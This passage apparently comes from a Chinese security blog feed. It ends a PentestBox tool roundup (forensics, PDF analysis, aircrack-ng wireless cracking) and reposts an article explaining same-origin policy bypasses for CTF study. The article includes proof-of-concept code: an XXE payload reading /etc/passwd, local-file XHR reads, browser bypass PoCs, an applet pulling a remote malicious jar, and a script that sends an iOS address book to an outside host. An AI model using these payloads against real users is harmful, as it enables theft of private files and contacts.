+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;bulkextractor
+</code></pre><p>CapTipper——CapTipper是一个python工具，用于分析，探索和恢复HTTP恶意流量。 CapTipper设置了一个Web服务器，该服务器与PCAP文件中的服务器完全一样，并且包含内部工具，以及一个强大的交互式控制台，用于分析和检查发现的主机，对象和对话。</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;captipper
+</code></pre><p><strong>DumpZilla</strong>——Dumpzilla应用程序是在Python 3.x中开发的，目的是提取Firefox，Iceweasel和Seamonkey浏览器的所有取证有趣的信息进行分析。 由于其Python 3.x开发，可能无法在旧的Python版本正常工作，主要是与某些字符。 在Unix和Windows 32/64位系统下工作。 在命令行界面中工作，所以信息转储可以通过管道重定向工具，如grep，awk，cut，sed …<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;dumpzilla
+</code></pre><p><strong>Loki</strong> ——扫描仪的简单指标妥协。检测是基于四个检测方法:<br>国际奥委会文件名称:正则表达式匹配完整的文件路径和名称<br>雅苒规则检查:雅苒签名匹配文件内存和处理数据<br>哈希校验:比较已知的恶意散列(MD5、SHA1,SHA256)和扫描文件</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;loki
+</code></pre><p><strong>Make PDF Tools</strong>——make-pdf-javascript。py允许与嵌入JavaScript创建一个简单的PDF文档打开时将执行的PDF文档。它本质上是mPDF胶水代码。py模块包含一个类方法来创建标题,间接对象,stream objects,stream objects和XREFs。<br>作者:/迪迪埃·史蒂文斯</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;make-pdf-embedded
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;make-pdf-javascript
+</code></pre><p><strong>Origami</strong>–Origami是一个用于操作PDF文档的Ruby框架。 它具有PDF兼容的解析器，并允许分析，修改或创建恶意的PDF文件。 虽然它可能用于多种用途，但折纸主要用作安全工具。 因此，它不专注于文档的图形内容，并且不包括PDF渲染器。<br>许可:GPL</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;pdfsh
+</code></pre><p><strong>pedump</strong>-一个纯ruby实现win32 PE二进制文件转储。<br>作者:zed_0xff<br>许可:麻省理工学院</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;pedump
+</code></pre><p><strong>PDF Parser</strong>——这个工具将解析一个PDF文档识别分析文件中使用的基本要素。它不会呈现一个PDF文档。<br>作者:迪迪埃·史蒂文斯</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;pdf-parser
+</code></pre><p><strong>pdfid</strong>——这个工具不是一个PDF解析器,但它将扫描一个文件寻找某些PDF关键词,允许您识别PDF文档包含JavaScript或执行一个动作(例如)当打开。PDFiD还将处理名称混淆。<br>作者:迪迪埃·史蒂文斯</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;pdfid
+</code></pre><p><strong>PeePD</strong>F——peepdf是一个Python工具探索PDF文件为了找出如果文件可以是有害的。这个工具的目的是提供所有必需的组件安全研究员可以在不使用PDF分析需要3或4工具的所有任务。与peepdf可以看到所有可疑的元素,在文档中显示的对象支持最常用的过滤器和编码,可以解析一个文件的不同版本,对象流和加密的文件。<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;peepdf
+</code></pre><p><strong>rekall</strong> —Rekall框架是一个完全开放的工具集合，在GNU通用公共许可证下的Python中实现，用于从易失性内存（RAM）样本中提取数字工件。 提取技术完全独立于所研究的系统来执行，但是提供了到系统的运行时状态的可见性。<br>作者:谷歌<br>许可:GPLv2</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;rekall
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;winpmem
+</code></pre><p><strong>Volatility</strong>—–Volatility框架是一个完全开放的工具集合，在GNU通用公共许可证下的Python中实现，用于从易失性内存（RAM）样本中提取数字工件。 提取技术完全独立于所研究的系统来执行，但是提供了到系统的运行时状态的可见性。 该框架旨在向人们介绍与从易失性内存采样中提取数字伪像相关的技术和复杂性，并为这一令人兴奋的研究领域提供进一步工作的平台。<br>作者:稳定的基础<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;volatility
+</code></pre><p>无线攻击</p>
+<p>Aircrack-ng–Aircrack-ng 802.11是一个WEP和WPA-PSK密钥破解程序,可以恢复密钥一旦足够的数据包捕获。它实现了标准FMS攻击以及一些优化KoreK攻击,以及全新的PTW攻击,从而使攻击速度比其他WEP破解工具。<br>许可:GPLv2</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;airbase-ng
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;aircrack-ng
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;aircrack-ng-GUI
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;airdecap-ng
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;airdecloak-ng
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;aireplay-ng
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;airodump-ng
+
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;airolib-ng
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;airtun-ng
+
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;besside-ng
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;easside-ng
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;ivstools
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;kstats
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;makeivs-ng
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;packetforge-ng
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;tkiptun-ng
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;wesside-ng
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;wpaclean
+</code></pre><p>6.13 文本编辑器</p>
+<p>使PenetestBox更棒,我补充道原子和vim文本编辑器。打开后原子会绝交Atom一边和终端的屏幕另一方面,虽然vim运行在相同的选项卡。原子分裂做是为了使报告更容易给控制台访问和编辑相同的屏幕上。</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;atom
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;vim
+</code></pre><p>6.14 Linux实用程序</p>
+<p>PentestBox提供几乎所有Linux实用程序在Windows环境中。下面的列表里面PentestBox Linux实用程序<br>antiword, basename, bash, bison, bzip2, cat, chmod, cmp, connect, cp, curl, cut, date, diff, dirname, du, env, expr, false, find, flex, gawk, git, grep, gunzip, gzip, head, id, kill, mkdir, md5sum, ls, ln , mv, openssl, patch, ps, rebase, rm, rmdir, scp, sh, ssh-keygen, touch, tr, true, uname, uniq, unzip, wc, xargs</p>
+<p>也使PentestBox更棒,我们也包括HTTPie,HTTPie是一个命令行HTTP客户端。它的目标是使CLI与web服务交互尽可能人性化。它提供了一个简单的http命令,允许发送任意http请求使用一个简单的和自然的语法,并显示彩色的输出。HTTPie可以用于测试、调试和一般与HTTP服务器交互。</p>
+<p>6.15 浏览器<br>PentestBox还包含一个修改后的版本Mozilla Firefox所有的安全插件前安装。查看所有以前安装的插件,点击在这里</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;firefox
+</code></pre><p>同时,我们已经包括在内SQLite浏览器在里面。</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;sqlitebrowser
+</code></pre><p><a href="http://www.secist.com/archives/2440.html" target="_blank" rel="external">http://www.secist.com/archives/2440.html</a><br><a href="https://tools.pentestbox.org/#linux-utilities" target="_blank" rel="external">https://tools.pentestbox.org/#linux-utilities</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-Pentest-BOX&quot;&gt;&lt;a href=&quot;#0x01-Pentest-BOX&quot; class=&quot;headerlink&quot; title=&quot;0x01 Pentest BOX&quot;&gt;&lt;/a&gt;0x01 Pentest BOX&lt;/h3&gt;&lt;p&gt;Pentest Box：渗透测试盒子,是一款Windows平台下预配置的便携式开源渗透测试环境，而它也是著名黑客Kapustkiy常用的工具之一。这里集成的大都是Linux下的工具,Kali Linux上面的常用的很多工具这里面也都集成了。&lt;br&gt;它打包了所有的安全工具，并且可以在Windows系统中原生地运行，有效地降低了对虚拟机或者双启动环境的需求。&lt;br&gt;PentestBox官网：&lt;a href=&quot;https://pentestbox.org/zh/&quot;&gt;https://pentestbox.org/zh/&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;0x02-Pentest-BOX特性&quot;&gt;&lt;a href=&quot;#0x02-Pentest-BOX特性&quot; class=&quot;headerlink&quot; title=&quot;0x02 Pentest BOX特性&quot;&gt;&lt;/a&gt;0x02 Pentest BOX特性&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;易于使用&lt;br&gt;设计简洁
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>同源策略详解及绕过(转)</title>
+    <link href="http://yoursite.com/2016/12/13/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E8%AF%A6%E8%A7%A3%E5%8F%8A%E7%BB%95%E8%BF%87-%E8%BD%AC/"/>
+    <id>http://yoursite.com/2016/12/13/同源策略详解及绕过-转/</id>
+    <published>2016-12-13T09:54:23.000Z</published>
+    <updated>2016-12-13T12:15:03.664Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-同源策略"><a href="#0x01-同源策略" class="headerlink" title="0x01 同源策略"></a>0x01 同源策略</h3><p><strong>最近CTF中一直出现同源策略的绕过以及XSS绕过CSP等题目，搞得我完全懵逼，什么也不会，于是才打算这几天静下心来闭关修炼几天。</strong><br>所谓同源是指，域名，协议，端口相同。不同源的客户端脚本(javascript、ActionScript)在没明确授权的情况下，不能读写对方的资源。<br>简单的来说，浏览器允许包含在页面A的脚本访问第二个页面B的数据资源，这一切是建立在A和B页面是同源的基础上。<br>假设你已经成功登录Gmail服务器，同时在同一个浏览器访问恶意站点（另一个浏览器选项卡）。没有同源策略，攻击者可以通过JavaScript获取你的邮件以及其他敏感信息，比如说阅读你的私密邮件，发送虚假邮件，看你的聊天记录等等。<br>将Gmail替换为你的银行帐户，问题就大条了。<br><a id="more"></a></p>
+<h3 id="0x02-常见同源策略以及绕过"><a href="#0x02-常见同源策略以及绕过" class="headerlink" title="0x02 常见同源策略以及绕过"></a>0x02 常见同源策略以及绕过</h3><h4 id="SOP和DOM：同源策略与文档对象模型"><a href="#SOP和DOM：同源策略与文档对象模型" class="headerlink" title="SOP和DOM：同源策略与文档对象模型"></a>SOP和DOM：同源策略与文档对象模型</h4><p>当我们谈论如何使用JavaScript访问DOM时，我们考虑了URL的三个要素（主机名 + 访问协议 + 端口号）<br>如果不止一个站点拥有相同的主机名、访问协议、端口号，那么他是能够成功访问到DOM的。然而，IE仅仅只是验证主机名以及访问协议，忽略了端口号。</p>
+<p>在大多数情况下，多个站点可能在同一根域（获取源页面的DOM）。</p>
+<p>例如，cart.httpsecure.org需要访问login.httpsecure.org来进行身份验证。在这种情况下，网站可以使用document.domain属性允许相同域下的其他站点进行DOM交互。如果你允许cart.httpsecure.org与login.httpsecure.org进行交互，开发者需要在两个站点的根域设置document.domain属性。</p>
+<pre><code>document.domain = “httpsecure.org”
+</code></pre><p>这表示在当前页面，httpsecure.org下的任何站点都可以访问DOM资源。当你这样设置后，你应该时刻保持警惕！比如说你部署在网络上的另一个站点about.httpsecure.org，假设这个站点存在漏洞，那么cart.httpsecure.org这个站点也可能存在漏洞并且可以访问这个源。</p>
+<p>如果攻击者能够上传一些恶意代码，那么about.httpsecure.org也会获得访问其他站点的权限。</p>
+<h4 id="SOP和CORS：同源策略与跨源资源共享"><a href="#SOP和CORS：同源策略与跨源资源共享" class="headerlink" title="SOP和CORS：同源策略与跨源资源共享"></a>SOP和CORS：同源策略与跨源资源共享</h4><p>跨源资源共享（CORS）是一种允许多种资源（图片，Css，字体，JavaScript等）在一个web页面请求域之外的另一个域的资源的机制。</p>
+<p>使用XMLHttpRequest对象发起HTTP请求就必须遵守同源策略。具体而言，Web应用程序能且只能使用XMLHttpRequest对象向其加载的源域名发起HTTP请求，而不能向任何其它域名发起请求。跨源资源共享这种机制让Web应用服务器能支持跨站访问控制，从而使得安全地进行跨站数据传输成为可能。</p>
+<p>如果httpsecure.org源返回下面的响应头，所有httpsecure.org的子域与根域就打开了一个双向的通信通道:</p>
+<pre><code>Access-Control-Allow-Origin: *.Httpsecure.org
+Access-Control-Allow-Methods: OPTIONS, GET, POST, HEAD, PUT
+Access-Control-Allow-Headers: X-custom
+Access-Control-Allow-Credentials: true
+</code></pre><p>在上面的响应头中，第一行定义了双向通信通道，第二行定义了请求可以使用OPTIONS, GET, POST, PUT, HEAD中的任何方式，第三行则是定义的响应头，最后一行允许经过身份验证的资源进行通信。  </p>
+<h4 id="SOP与plugins：同源策略与插件"><a href="#SOP与plugins：同源策略与插件" class="headerlink" title="SOP与plugins：同源策略与插件"></a>SOP与plugins：同源策略与插件</h4><p><strong>注释：如果在httpsecure.org:80安装插件，那么只能允许插件访问httpsecure.org:80</strong></p>
+<p>由于不同的绕过方法，在Java，Adobe Reader，Flash，Silverlight中实现同源策略是十分痛苦的。大多数浏览器都使用他们自己的方式实现同源策略，如果处在同一个IP地址，一些Java版本会认为两个不同的域名应用同一个同源策略。这对于虚拟主机环境（多个域名使用同一个IP）来说可能是一个毁灭性的灾难。</p>
+<p>谈论Flash player以及PDF reader插件，他们都有一个悠久的漏洞历史。这些漏洞大多数都是允许攻击者远程执行任意代码，这远比同源策略绕过更可怕！</p>
+<p>在Flash中，你可以通过crossdomain.xml管理跨源通信，该文件一般在根目录下</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;cross-domain-policy&gt;
+&lt;site-control permitted-cross-domain-policies=&quot;by-content-type&quot;/&gt;
+&lt;allow-access-from domain=&quot;*.httpsecure.org&quot; /&gt;
+&lt;/cross-domain-policy&gt;
+</code></pre><p>使用这段代码的httpsecure.org子域可以实现站点的双向通信，Crossdomain.xml还支持Java以及JavaScript插件。</p>
+<h4 id="SOP与UI-redressing：同源策略与界面伪装"><a href="#SOP与UI-redressing：同源策略与界面伪装" class="headerlink" title="SOP与UI redressing：同源策略与界面伪装"></a>SOP与UI redressing：同源策略与界面伪装</h4><p>点击劫持（clickjacking）是一种在网页中将恶意代码等隐藏在看似无害的内容（如按钮）之下，并诱使用户点击的手段。该术语最早由雷米亚·格罗斯曼（Jeremiah Grossman）与罗伯特·汉森（Robert Hansen）于2008年提出。这种行为又被称为界面伪装（UI redressing）。对于攻击者同源策略绕过，方法各有不同。事实上一部分攻击还是利用同源策略没有执行。</p>
+<h4 id="Java同源策略绕过"><a href="#Java同源策略绕过" class="headerlink" title="Java同源策略绕过"></a>Java同源策略绕过</h4><p>在Java1.7u17版本和1.6u45版本中，如果两个主机名解析到同一个IP地址，那么就不会执行同源策略（Httpsecure.org和 httpssecure.com解析到同一个IP地址）。Java applet（是一种在Web环境下，运行于客户端的Java程序组件，每个Applet的功能都比较单一）可以解决跨院请求和读取响应信息。</p>
+<p>在Java6和Java7版本，如果两个主机名解析到同一个IP地址，那么会被认定为两个主机是相同的。</p>
+<p>在Java同源策略中实现这种类型的漏洞，那会十分恐怖。特别是对于虚拟主机（多个域名解析到同一个IP地址）来说，那将是毁灭性的灾难。</p>
+<p>最重要的是，通过applet使用BufferedReader和InputStreamReader对象考虑有关的权限需要。在Java1.6不需要运行applet实现用户交互，在1.7版本就不同了。现在用户必须使用点击播放特性(click to play feature)运行有签名和没有签名的applet，这个特性可以使用IMMUNITY来绕过并且导致了后来的CVE-2011-3546（在Java中同源策略绕过）。类似的在Adobe reader也发现了同源策略绕过。</p>
+<pre><code>&lt;applet
+code=&quot;malicious.class&quot;
+archive=&quot;http://httpsecure.org?redirect_to=
+
+http://securityhacking123.com/malicious.jar&quot;
+
+width=&quot;100&quot; height=&quot;100&quot;&gt;
+&lt;/applet&gt;
+</code></pre><h4 id="Adobe-Reader同源策略绕过"><a href="#Adobe-Reader同源策略绕过" class="headerlink" title="Adobe Reader同源策略绕过"></a>Adobe Reader同源策略绕过</h4><p>Adobe Reader在浏览器插件中存在许多的安全问题，其大部分漏洞都是由于溢出问题导致的任意代码执行漏洞。在Adobe Reader PDF中可以使用JavaScript，正是这个原因，所以有很多恶意软件将代码隐藏在PDF文件之中。</p>
+<p>CVE-2013-0622通过未明向量，远程攻击者利用该漏洞绕过预期的访问限制。</p>
+<p>如果我们谈论到XXE Injection，这涉及到试图注入恶意负载到请求中，输入如下：</p>
+<pre><code>&lt;!DOCTYPE bar &gt;
+&lt;!ELEMENT bar ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot; &gt;]&gt;&lt;bar&gt;&amp;xxe;&lt;/bar&gt;
+</code></pre><p>&amp;XXE的值取而代之的是/etc/passwd，这项技术可以被用到同源策略绕过，它会加载XE并且服务器会返回一个302重定向响应。</p>
+<h4 id="Adobe-Flash同源策略绕过"><a href="#Adobe-Flash同源策略绕过" class="headerlink" title="Adobe Flash同源策略绕过"></a>Adobe Flash同源策略绕过</h4><p>Adobe Flash使用crossdomain.xml文件控制Flash接收数据。我们可以在该文件中添加限制，只信任添加在内的站点。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;cross-domain-policy&gt;
+&lt;site-control permitted-cross-domain-policies=&quot;by-content-type&quot;/&gt;
+&lt;allow-access-from domain=&quot;*&quot; /&gt;
+&lt;/cross-domain-policy&gt;
+</code></pre><p>通过设置allow-access-from属性的域，您可以允许访问来自任何域的文档。</p>
+<h4 id="Silverlight同源策略绕过"><a href="#Silverlight同源策略绕过" class="headerlink" title="Silverlight同源策略绕过"></a>Silverlight同源策略绕过</h4><p>Silverlight是微软推出的一款插件，其与Flash使用相同的同源策略。然而，其使用的clientaccess-policy.xml代码如下所示：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;access-policy&gt;
+&lt;cross-domain-access&gt;
+&lt;policy&gt;
+&lt;allow-from&gt;
+&lt;domain uri=&quot;*&quot;/&gt;
+&lt;/allow-from&gt;
+&lt;grant-to&gt;
+&lt;resource path=&quot;/&quot; include-subpaths=&quot;true&quot;/&gt;
+&lt;/grant-to&gt;
+&lt;/policy&gt;
+&lt;/cross-domain-access&gt;
+&lt;/access-policy&gt;
+</code></pre><p>请记住Silverlight与Flash是不同的，如Silverlight没有隔离基于协议和端口的不同源的访问，而Flash就会隔离。所以在Silverlight中 <a href="https://Httpsecure.org" target="_blank" rel="external">https://Httpsecure.org</a>  和 <a href="http://Httpsecure.org" target="_blank" rel="external">http://Httpsecure.org</a>  会被认为是同源。</p>
+<h4 id="Internet-Explorer同源策略绕过"><a href="#Internet-Explorer同源策略绕过" class="headerlink" title="Internet Explorer同源策略绕过"></a>Internet Explorer同源策略绕过</h4><p>Internet Explorer8以及前面的版本很容易通过document.domain实现同源策略绕过，通过重写文档对象，域属性这个问题可以十分轻松的被利用。</p>
+<pre><code>var document;
+document = {};
+document.domain = ‘httpsecure.org&apos;;
+alert(document.domain);
+</code></pre><p>如果你在最新的浏览器中运行这段代码，可能在JavaScript控制台会显示一个同源策略绕过错误。</p>
+<h4 id="Safari同源策略绕过"><a href="#Safari同源策略绕过" class="headerlink" title="Safari同源策略绕过"></a>Safari同源策略绕过</h4><p>为了帮助大家更好的理解，<a href="http://httpsecure.org" target="_blank" rel="external">http://httpsecure.org</a> 和file://httpsecure 都视为不同源，Safari浏览器(IOS以及MAC)6.0.2版本当需要访问本地资源时不执行同源策略。尝试使用file协议打开一个HTML文件，包含在文件内的JavaScript代码可以绕过同源策略。</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt; I&apos;m a local file loaded using the file:// scheme &lt;/h1&gt;
+&lt;script&gt;
+xhr = new XMLHttpRequest(); xhr.onreadystatechange = function (){ if (xhr.readyState == 4) { alert(xhr.responseText);
+}
+}; xhr.open(&quot;GET&quot;, &quot;http://httpsecure.org/docs/safari_sameoriginpolicy_bypassing/other_origin.html&quot;); xhr.send();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>现在页面使用file协议进行加载，执行上面的请求之后，XMLHTTPRequest对象仍然能够获得响应信息。</p>
+<h4 id="Firefox同源策略绕过"><a href="#Firefox同源策略绕过" class="headerlink" title="Firefox同源策略绕过"></a>Firefox同源策略绕过</h4><p>Firefox是最常见的浏览器，这个同源策略绕过是2012年10月份Gareth Heyes发现。这个问题存在于Firefox16中脱离同源策略的限制，导致未经授权访问window.location对象。</p>
+<p>绕过代码如下：</p>
+<pre><code>&lt;!Doctype html&gt;
+&lt;script&gt;
+function poc() {
+var win = window.open(&apos;https://httpsecure.org/abc/&apos;, &apos;newWin&apos;,
+&apos;width=200,height=200&apos;);
+setTimeout(function(){
+alert(&apos;Hello &apos;+/^https:\/\/httpsecure.org\/([^/]+)/.exec(
+win.location)[1])
+}, 5000);
+}
+&lt;/script&gt;
+&lt;input type=button value=&quot;Firefox knows&quot; onclick=&quot;poc()&quot;&gt;
+</code></pre><p>在一个你操控的源上执行上面的代码，浏览器会弹出另一个选项卡进行HTTPS验证。加载httpsecure.org/abc以及重定向到 <a href="https://httpsecure.org/" target="_blank" rel="external">https://httpsecure.org/</a> <user_uid>/lists（user_uid是你的httpsecure handle）。5秒钟之后，exec函数将触发window.location对象解析正则表达式，这会导致在警告框中显示httpsecure handle。</user_uid></p>
+<p>2012年8月，当火狐发布支持HTML5沙盒iframe的版本时，布朗发现当把沙盒iframe的属性设置为allow-script，来自iframe的虚假JavaScript仍然可以访问window.top，这将会改变外部的window.location。</p>
+<pre><code>&lt;!-- Outer file, bearing the sandbox --&gt;
+&lt;iframe src=&quot;inner.html&quot; sandbox=&quot;allow-scripts&quot;&gt;&lt;/iframe&gt;
+框架代码：
+
+&lt;!-- Framed document , inner.html --&gt;
+&lt;script &gt;
+// escape sandbox:
+if(top != window) { top.location = window.location; }
+// all following JavaScript code and markup is unrestricted:
+// plugins, popups and forms allowed.
+&lt;/script&gt;
+</code></pre><p>这段代码需要指定额外的allow-top-navigation代码，允许JavaScript加载一个iframe改变窗口位置，攻击者可以使用它重定向目标用户到指定的恶意网站。</p>
+<p>注意：在HTML5，新出现了一个叫做沙盒的iframe属性，这个新属性的关注点在于拥有一个更科学更安全的方式使用iframe。</p>
+<h4 id="Opera同源策略绕过"><a href="#Opera同源策略绕过" class="headerlink" title="Opera同源策略绕过"></a>Opera同源策略绕过</h4><p>这个同源策略绕过是由Heyes发现的，当覆盖函数或者创建一个location对象的iframe，Opera没有正确执行同源策略。</p>
+<p>让我们看下面的代码示例：</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;iframe id=&quot;ifr&quot; src=&quot;http://httpsecure.org/xdomain.html&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;
+var iframe = document.getElementById(&apos;ifr&apos;);
+function do_something(){
+var iframe = document.getElementById(&apos;ifr&apos;);
+iframe.contentWindow.location.constructor.
+prototype.     defineGetter__.constructor(&apos;[].constructor. prototype.join=function(){console.log(&quot;pwned&quot;)}&apos;)();
+}
+setTimeout(&quot;do_something()&quot;,3000);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>下面是来自不同源的框架内容：</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;b&gt;I will be framed from a different origin&lt;/b&gt;
+&lt;script&gt;
+function do_join(){ [1,2,3].join();
+console.log(&quot;join() after prototype override: &quot;
++ [].constructor.prototype.join);
+}
+console.log(&quot;join() after prototype override: &quot;
++ [].constructor.prototype.join);
+setTimeout(&quot;do_join();&quot;, 5000);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>在上述框架代码，当在数组中调用join()，就会使用constructor.prototype.join原生代码值。几秒钟之后， [1,2,3]数组调用join()，如果你对上面的代码有一个清晰的认识，那么你肯定看到join()被do_something()覆盖。</p>
+<p>实际情况中，这个绕过也是有局限性的，只能在某些安全防护较低的站点使用。</p>
+<p>举个例子，我们在Opera浏览器中打开两个选项卡，其中一个选项卡是已经被攻下的页面，另外一个是身份验证页面。如果你在身份验证页面源里面创建一个iframe包含src标签，你就可以浏览到iframe框架内的所以内容了。</p>
+<h4 id="云存储中同源策略绕过"><a href="#云存储中同源策略绕过" class="headerlink" title="云存储中同源策略绕过"></a>云存储中同源策略绕过</h4><p>如果你认为同源策略绕过只存在在Web浏览器以及一些插件那就错了，云存储服务器也是存在同源策略绕过的。DROPBOX 1.4.6（iOS），DROPBOX 2.01（Android）和Google Drive 1.0.1(iOS)，这些都提供用户将文件存储到云端。Roi Saltzman发现了一个类似于Safari的同源策略绕过。这个绕过依赖于在高权限区域加载一个文件。</p>
+<p>File://var/mobile/application/app_uuid</p>
+<p>如果攻击者通过客户端欺骗用户加载一个HTML文件，包含在该文件中的JavaScript就会自动执行。这种攻击方式，需要满足JavaScript能够获取移动设备的本地文件系统。</p>
+<p>仅供参考：如果HTML使用file协议进行加载，就无法组织JavaScript获取其他文件了。</p>
+<p>file:///var/mobile/Library/AddressBook/AddressBook.sqlitedb</p>
+<p>上述链接中包含的AddressBook为iOS用户的联系人信息，如果目标应用不允许进行外部访问，你还可以对缓存进行检索。</p>
+<p>如果用户访问这个恶意链接，用户的联系人信息就会被发送到httpsecure.org.</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+local_xhr = new XMLHttpRequest();
+local_xhr.open(&quot;GET&quot;, &quot;file:///var/mobile/Library/AddressBook/
+150 Chapter 4 ■ Bypassing the Same Origin Policy
+AddressBook.sqlitedb&quot;); local_xhr.send(); local_xhr.onreadystatechange = function () { if (local_xhr.readyState == 4) {
+remote_xhr = new XMLHttpRequest(); remote_xhr.onreadystatechange = function () {}; remote_xhr.open(&quot;GET&quot;, &quot;http://httpsecure.org/?f=&quot; + encodeURI(local_xhr.responseText)); remote_xhr.send();
+}
+}
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h4 id="跨源资源共享-CORS-中的同源策略绕过"><a href="#跨源资源共享-CORS-中的同源策略绕过" class="headerlink" title="跨源资源共享(CORS)中的同源策略绕过"></a>跨源资源共享(CORS)中的同源策略绕过</h4><p>CORS也存在同源策略绕过，CORS中的Access-Control-Allow-Origin: *可能存在着错误设置。</p>
+<p>上面的代码中就存在一个潜在的设置错误，据某机构统计表明有大概100万应用存在这Access-Control-Allow-Origin: *头设置错误。这就意味着允许任何互联网中的应用向这个站点提交一个交叉源请求，并获取返回响应。</p>
+<p><strong>转自：<a href="http://www.freebuf.com/articles/web/65468.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/65468.html</a></strong></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-同源策略&quot;&gt;&lt;a href=&quot;#0x01-同源策略&quot; class=&quot;headerlink&quot; title=&quot;0x01 同源策略&quot;&gt;&lt;/a&gt;0x01 同源策略&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;最近CTF中一直出现同源策略的绕过以及XSS绕过CSP等题目，搞得我完全懵逼，什么也不会，于是才打算这几天静下心来闭关修炼几天。&lt;/strong&gt;&lt;br&gt;所谓同源是指，域名，协议，端口相同。不同源的客户端脚本(javascript、ActionScript)在没明确授权的情况下，不能读写对方的资源。&lt;br&gt;简单的来说，浏览器允许包含在页面A的脚本访问第二个页面B的数据资源，这一切是建立在A和B页面是同源的基础上。&lt;br&gt;假设你已经成功登录Gmail服务器，同时在同一个浏览器访问恶意站点（另一个浏览器选项卡）。没有同源策略，攻击者可以通过JavaScript获取你的邮件以及其他敏感信息，比如说阅读你的私密邮件，发送虚假邮件，看你的聊天记录等等。&lt;br&gt;将Gmail替换为你的银行帐户，问题就大条了。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Nessus的安装与使用</title>
+    <link href="http://yoursite.com/2016/12/09/Nessus%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
+    <id>http://yoursite.com/2016/12/09/Nessus的安装与使用/</id>
+    <published>2016-12-09T13:30:50.000Z</published>
+    <updated>2016-12-09T13:39:06.302Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-Nessus"><a href="#0x01-Nessus" class="headerlink" title="0x01 Nessus"></a>0x01 Nessus</h3><p>Nessus号称是世界上最流行的漏洞扫描程序，全世界有超过75000个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus不同于传统的漏洞扫描软件，Nessus可同时在本机或远端上遥控，进行系统的漏洞分析扫描。对应渗透测试人员来说，Nessus是必不可少的工具之一。<br>Nessus通常包括成千上万的最新的漏洞，各种各样的扫描选项，及易于使用的图形界面和有效的报告。Nessus之所以被人们喜爱，是因为该工具具有几个特点。如下所示：<a id="more"></a></p>
+<blockquote>
